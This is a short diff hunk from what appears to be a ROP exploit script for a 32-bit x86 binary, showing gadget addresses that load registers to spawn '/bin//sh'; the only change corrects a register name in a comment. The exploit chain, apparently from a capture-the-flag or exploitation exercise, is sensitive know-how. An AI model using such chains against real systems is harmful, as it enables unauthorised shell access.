@@ -48,7 +48,7 @@ ROP += p32(0x080a3a1d) # mov dword ptr [edx], eax ; ret
 # ebx points to "/bin//sh"
 ROP += p32(0x080481c9) # pop ebx ; ret
 ROP += p32(0x080ed000) # @ .data
-# ebx points to null
+# ecx points to null
 ROP += p32(0x080e76ad) # pop ecx ; ret
 ROP += p32(0x080ed008) # @ .data + 8
 # edx points to null
